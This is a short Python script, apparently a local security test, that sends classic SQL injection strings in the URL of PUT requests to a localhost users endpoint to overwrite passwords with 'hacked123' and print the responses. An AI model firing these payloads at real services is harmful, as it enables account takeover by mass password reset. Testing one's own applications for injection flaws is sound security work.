import requests

# Target base URL
base_url = "http://localhost:5000/users/"

# SQL injection test payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 'a'='a"
]

# The new password we try to inject (can be any dummy value for testing)
new_password = "hacked123"


def test_sql_injection():
    for payload in payloads:
        target_url = base_url + payload
        print(f"\nTesting payload: {payload}")
        try:
            response = requests.put(target_url, json={"newPass": new_password})
            print(f"Status Code: {response.status_code}")
            print(f"Response Body:\n{response.text[:500]}")
        except Exception as e:
            print(f"Request failed: {e}")


if __name__ == "__main__":
    test_sql_injection()
